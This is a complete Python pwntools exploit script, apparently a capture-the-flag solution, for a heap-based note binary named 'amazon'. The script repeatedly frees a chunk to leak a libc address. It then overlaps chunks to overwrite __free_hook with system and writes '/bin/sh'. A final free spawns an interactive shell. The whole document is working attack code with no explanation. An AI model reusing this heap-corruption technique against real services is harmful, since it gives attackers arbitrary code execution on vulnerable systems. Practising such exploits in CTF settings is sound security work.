from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
elf = ELF("./amazon")
p = elf.process()
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p = remote("")
if args.G:
	gdb.attach(p)

def add(size, content):
	p.recvuntil("Your choice: ")
	p.sendline("1")
	p.recvuntil("want to buy: ")
	p.sendline("1")
	p.recvuntil("How many: ")
	p.sendline("1")
	p.recvuntil("How long is your note: ")
	p.sendline(str(size))
	p.recvuntil(":")
	p.send(content)
def show():
	p.recvuntil("Your choice: ")
	p.sendline("2")

def free(idx):
	p.recvuntil("Your choice: ")
	p.sendline("3")
	p.recvuntil("for: ")
	p.sendline(str(idx))
def exp():
	add(0x80, 'a')#0
	add(0x90, 'b')#1
	add(0x10, 'd')#3
	for _ in range(8):
		free(0)
	show()
	p.recvuntil("Name: ")
	libc.address = u64(p.recvn(6) + '\x00'*2)-0x3ebca0
	success("libc.address ==> " + hex(libc.address))
	for _ in range(8):
		free(1)
	add(0x100, '\xdd'*0x80 + p64(1)+p64(0xc0)+p64(libc.sym['__free_hook']-0x40))
	free(0)
	add(0x90, 'a')
	add(0x100, '\xdd'*0x80 + p64(1)+p64(0xc0)+'/bin/sh\x00')
	add(0x90, '\x00'*0x20 + p64(libc.sym['system']))
	#gdb.attach(p)	
	free(1)
	
	p.interactive()
if __name__ == '__main__':
	exp()
